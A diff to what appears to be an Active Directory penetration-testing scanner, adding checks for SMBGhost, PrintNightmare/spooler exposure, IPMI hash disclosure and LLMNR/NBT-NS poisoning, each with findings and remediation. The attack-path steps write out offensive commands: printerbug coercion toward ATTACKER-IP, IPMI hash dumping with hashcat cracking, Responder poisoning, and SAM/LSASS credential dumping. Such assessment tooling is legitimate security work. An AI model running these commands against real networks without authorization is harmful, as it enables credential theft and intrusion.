@@ -1170,6 +1170,336 @@ def check_snmp_default_community(
     return result
 
 
+def check_smbghost(runner: ToolRunner, target: Target, timeout: int = 120) -> CheckResult:
+    """Detect SMBGhost (CVE-2020-0796) - unauthenticated SMBv3.1.1 RCE.
+
+    A compression flaw in SMBv3.1.1 (Windows 10/Server 1903-1909) allows
+    unauthenticated remote code execution. Like EternalBlue, a hit means SYSTEM
+    on the host and therefore local-admin / cached domain credentials.
+    """
+    name = "SMBGhost (CVE-2020-0796) SMBv3 RCE"
+    skip = require_tool(runner, "nxc", name, CATEGORY)
+    if skip:
+        return skip
+
+    result = CheckResult(name=name, category=CATEGORY)
+    argv = ["nxc", "smb", target.host, "-u", "", "-p", "", "-M", "smbghost"]
+    out = runner.run(argv, timeout=timeout)
+    result.command = out.command
+    result.raw_output = out.combined
+    result.return_code = out.return_code
+    result.duration_seconds = out.duration_seconds
+    if out.error:
+        result.error = out.error
+        return result
+
+    text = out.combined
+    vulnerable = re.search(r"smbghost.*VULNERABLE|VULNERABLE.*smbghost|CVE-2020-0796.*vulnerable",
+                           text, re.IGNORECASE)
+    if vulnerable:
+        result.add_finding(
+            Finding(
+                title="Host vulnerable to SMBGhost (CVE-2020-0796)",
+                severity=Severity.CRITICAL,
+                target=target.host,
+                description=(
+                    "The host is vulnerable to SMBGhost (CVE-2020-0796), an "
+                    "unauthenticated SMBv3.1.1 compression RCE. Exploiting it "
+                    "yields SYSTEM, from which SAM/LSASS secrets (local-admin "
+                    "and cached domain credentials) can be dumped."
+                ),
+                evidence=text[:600],
+                remediation=(
+                    "Apply the CVE-2020-0796 patch and, as a workaround, disable "
+                    "SMBv3 compression."
+                ),
+            )
+        )
+        result.add_step(
+            PathStep(
+                name="SMBGhost -> SYSTEM -> dump SAM/LSASS",
+                technique="SMBGhost",
+                requires=frozenset({Capability.UNAUTHENTICATED}),
+                grants=Capability.NETWORK_FOOTHOLD,
+                command=(
+                    f"# CVE-2020-0796 against {target.host} (SMBGhost LPE/RCE PoC) "
+                    "-> SYSTEM -> dump SAM/LSASS for local-admin / cached domain creds"
+                ),
+                description=(
+                    "Exploit SMBGhost for SYSTEM on the host, then dump "
+                    "credentials for reuse against the domain."
+                ),
+                reliability=Reliability.MODERATE,
+                noise=Noise.LOUD,
+                detail=target.host,
+                source="check",
+            )
+        )
+    else:
+        signal = looks_like_failure(text)
+        if signal:
+            result.mark_inconclusive(
+                f"SMBGhost check inconclusive; output shows '{signal}'"
+            )
+        elif not re.search(r"smbghost|cve-2020-0796|not vulnerable", text, re.IGNORECASE):
+            result.mark_inconclusive(
+                "smbghost module produced no recognizable output (module "
+                "unavailable or output changed)"
+            )
+    return result
+
+
+def check_printnightmare(runner: ToolRunner, target: Target, timeout: int = 120) -> CheckResult:
+    """Detect an exposed Print Spooler / PrintNightmare (CVE-2021-34527).
+
+    A reachable spooler (MS-RPRN) is a double win: it is a PrintNightmare RCE
+    vector and - more useful inside an AD assessment - a coercion source whose
+    machine-account authentication can be relayed (to LDAP for RBCD/shadow
+    creds, or to AD CS for ESC8). We model it as granting a coercion capability
+    so the path engine wires it straight into the existing relay chains.
+    """
+    name = "Print Spooler / PrintNightmare (MS-RPRN)"
+    skip = require_tool(runner, "nxc", name, CATEGORY)
+    if skip:
+        return skip
+
+    result = CheckResult(name=name, category=CATEGORY)
+    argv = ["nxc", "smb", target.host, "-u", "", "-p", "", "-M", "spooler"]
+    out = runner.run(argv, timeout=timeout)
+    result.command = out.command
+    result.raw_output = out.combined
+    result.return_code = out.return_code
+    result.duration_seconds = out.duration_seconds
+    if out.error:
+        result.error = out.error
+        return result
+
+    text = out.combined
+    spooler_up = re.search(r"spooler.*enabled|Spooler service.*(enabled|running)|PrintNightmare",
+                           text, re.IGNORECASE)
+    if spooler_up:
+        result.add_finding(
+            Finding(
+                title="Print Spooler reachable (PrintNightmare / coercion vector)",
+                severity=Severity.HIGH,
+                target=target.host,
+                description=(
+                    "The Print Spooler service (MS-RPRN) is reachable. It is a "
+                    "PrintNightmare (CVE-2021-34527) RCE vector and a MS-RPRN "
+                    "coercion source: the host can be forced to authenticate to "
+                    "an attacker listener, and that NTLM can be relayed (to LDAP "
+                    "for RBCD/shadow credentials, or to AD CS for ESC8)."
+                ),
+                evidence=text[:600],
+                remediation=(
+                    "Disable the Print Spooler on servers/DCs that don't need it "
+                    "and apply PrintNightmare patches with "
+                    "RpcAuthnLevelPrivacyEnabled."
+                ),
+            )
+        )
+        result.add_step(
+            PathStep(
+                name="Exposed spooler -> coerce machine authentication",
+                technique="PrinterBug",
+                requires=frozenset({Capability.UNAUTHENTICATED}),
+                grants=Capability.COERCIBLE_AUTH,
+                command=(
+                    f"printerbug.py DOMAIN/USER:PASS@{target.host} ATTACKER-IP  "
+                    "# or unauth MS-RPRN coercion; relay the captured auth"
+                ),
+                description=(
+                    "Use the reachable spooler (MS-RPRN) to coerce the host's "
+                    "machine-account authentication for NTLM relay."
+                ),
+                reliability=Reliability.HIGH,
+                noise=Noise.LOUD,
+                detail=target.host,
+                source="check",
+            )
+        )
+    else:
+        signal = looks_like_failure(text)
+        if signal:
+            result.mark_inconclusive(
+                f"spooler check inconclusive; output shows '{signal}'"
+            )
+        elif not re.search(r"spooler|printnightmare|rprn", text, re.IGNORECASE):
+            result.mark_inconclusive(
+                "spooler module produced no recognizable output (module "
+                "unavailable or output changed)"
+            )
+    return result
+
+
+def check_ipmi_hash_disclosure(
+    runner: ToolRunner, target: Target, timeout: int = 120
+) -> CheckResult:
+    """Detect IPMI 2.0 RAKP hash disclosure (CVE-2013-4786) on UDP 623.
+
+    IPMI 2.0 baseboard management controllers (iDRAC, iLO, Supermicro) return a
+    salted password hash during RAKP authentication to any unauthenticated
+    requester. The hash cracks offline; BMC credentials are frequently reused
+    and give out-of-band control of the server.
+    """
+    name = "IPMI 2.0 RAKP hash disclosure (CVE-2013-4786)"
+    skip = require_tool(runner, "nmap", name, CATEGORY)
+    if skip:
+        return skip
+
+    result = CheckResult(name=name, category=CATEGORY)
+    argv = [
+        "nmap", "-Pn", "-sU", "-p", "623",
+        "--script", "ipmi-version,ipmi-dumphashes",
+        target.host,
+    ]
+    out = runner.run(argv, timeout=timeout)
+    result.command = out.command
+    result.raw_output = out.combined
+    result.return_code = out.return_code
+    result.duration_seconds = out.duration_seconds
+    if out.error:
+        result.error = out.error
+        return result
+
+    text = out.combined
+    # ipmi-dumphashes prints "<user>:<hash>" lines; ipmi-version confirms IPMI 2.0.
+    hash_dumped = re.search(r"ipmi-dumphashes:.*?:\S{20,}", text, re.IGNORECASE | re.DOTALL)
+    ipmi_2 = re.search(r"IPMI-2\.0|IPMI 2\.0", text, re.IGNORECASE)
+    if hash_dumped or ipmi_2:
+        result.add_finding(
+            Finding(
+                title="IPMI BMC exposes crackable password hash (CVE-2013-4786)",
+                severity=Severity.HIGH,
+                target=target.host,
+                description=(
+                    "An IPMI 2.0 BMC returned (or will return) a salted RAKP "
+                    "password hash to an unauthenticated requester. The hash "
+                    "cracks offline; BMC credentials grant out-of-band server "
+                    "control and are often reused elsewhere."
+                ),
+                evidence=text[:600],
+                remediation=(
+                    "Restrict IPMI/BMC (UDP 623) to an isolated management VLAN, "
+                    "replace default credentials, and use strong unique "
+                    "passwords; the protocol flaw itself cannot be patched."
+                ),
+            )
+        )
+        result.add_step(
+            PathStep(
+                name="IPMI RAKP hash -> crack -> BMC/reusable credentials",
+                technique="IPMI-dumphashes",
+                requires=frozenset({Capability.UNAUTHENTICATED}),
+                grants=Capability.CRACKABLE_HASH,
+                command=(
+                    f"nmap -sU -p623 --script ipmi-dumphashes {target.host}  "
+                    "# then: hashcat -m 7300 ipmi.hash wordlist.txt"
+                ),
+                description=(
+                    "Dump the IPMI RAKP hash and crack it offline (hashcat mode "
+                    "7300) to recover BMC credentials for reuse."
+                ),
+                reliability=Reliability.MODERATE,
+                noise=Noise.QUIET,
+                detail=target.host,
+                source="check",
+            )
+        )
+    else:
+        if not re.search(r"ipmi|623/udp", text, re.IGNORECASE):
+            result.mark_inconclusive(
+                "could not determine IPMI exposure (UDP 623 filtered, host "
+                "unreachable, or nmap output changed)"
+            )
+    return result
+
+
+def check_name_poisoning(runner: ToolRunner, target: Target, timeout: int = 120) -> CheckResult:
+    """Detect LLMNR / NBT-NS / mDNS name-resolution poisoning exposure.
+
+    When LLMNR (UDP 5355), NBT-NS (UDP 137), or mDNS (UDP 5353) are enabled, an
+    attacker on the segment can answer failed name lookups and capture NetNTLM
+    hashes (Responder) for offline cracking or relay. Domainerator does not run
+    a poisoner inside a one-shot scan; it flags the exposure so the operator
+    knows the capture/relay opportunity exists.
+    """
+    name = "LLMNR / NBT-NS / mDNS poisoning exposure"
+    skip = require_tool(runner, "nmap", name, CATEGORY)
+    if skip:
+        return skip
+
+    result = CheckResult(name=name, category=CATEGORY)
+    argv = [
+        "nmap", "-Pn", "-sU", "-p", "137,5353,5355",
+        "--script", "nbstat,llmnr-resolve,dns-service-discovery",
+        target.host,
+    ]
+    out = runner.run(argv, timeout=timeout)
+    result.command = out.command
+    result.raw_output = out.combined
+    result.return_code = out.return_code
+    result.duration_seconds = out.duration_seconds
+    if out.error:
+        result.error = out.error
+        return result
+
+    text = out.combined
+    exposed = re.search(
+        r"(137|5353|5355)/udp\s+open|nbstat:|llmnr|mdns|dns-service-discovery",
+        text, re.IGNORECASE,
+    )
+    if exposed:
+        result.add_finding(
+            Finding(
+                title="Broadcast name resolution (LLMNR/NBT-NS/mDNS) exposed",
+                severity=Severity.MEDIUM,
+                target=target.host,
+                description=(
+                    "LLMNR, NBT-NS, or mDNS is enabled. An attacker on the local "
+                    "segment can poison failed name lookups and capture NetNTLM "
+                    "hashes (e.g. with Responder), then crack them offline or "
+                    "relay them (ntlmrelayx) to reachable hosts for code "
+                    "execution or RBCD/shadow-credential attacks."
+                ),
+                evidence=text[:600],
+                remediation=(
+                    "Disable LLMNR (GPO) and NBT-NS (DHCP option / per-adapter), "
+                    "disable mDNS where unused, and enforce SMB signing to blunt "
+                    "relay."
+                ),
+            )
+        )
+        result.add_step(
+            PathStep(
+                name="Poison name resolution -> capture NetNTLM hash",
+                technique="Responder-poisoning",
+                requires=frozenset({Capability.UNAUTHENTICATED}),
+                grants=Capability.CRACKABLE_HASH,
+                command=(
+                    "responder -I eth0 -wv  "
+                    "# capture NetNTLMv2 from poisoned LLMNR/NBT-NS/mDNS, then "
+                    "crack (hashcat -m 5600) or relay (ntlmrelayx)"
+                ),
+                description=(
+                    "Run a poisoner on the segment to capture NetNTLMv2 hashes "
+                    "for offline cracking or NTLM relay."
+                ),
+                reliability=Reliability.SPECULATIVE,
+                noise=Noise.MODERATE,
+                detail=target.host,
+                source="check",
+            )
+        )
+    else:
+        if not re.search(r"137|5353|5355|llmnr|nbt|mdns", text, re.IGNORECASE):
+            result.mark_inconclusive(
+                "could not determine LLMNR/NBT-NS/mDNS exposure (ports filtered, "
+                "host unreachable, or nmap output changed)"
+            )
+    return result
+
+
 def run_all(
     runner: ToolRunner,
     target: Target,
@@ -1192,4 +1522,8 @@ def run_all(
         check_eternalblue(runner, target, timeout=min(timeout, 180)),
         check_anonymous_ftp_nfs(runner, target, timeout=min(timeout, 120)),
         check_snmp_default_community(runner, target, timeout=min(timeout, 120)),
+        check_smbghost(runner, target, timeout=min(timeout, 120)),
+        check_printnightmare(runner, target, timeout=min(timeout, 120)),
+        check_ipmi_hash_disclosure(runner, target, timeout=min(timeout, 120)),
+        check_name_poisoning(runner, target, timeout=min(timeout, 120)),
     ]
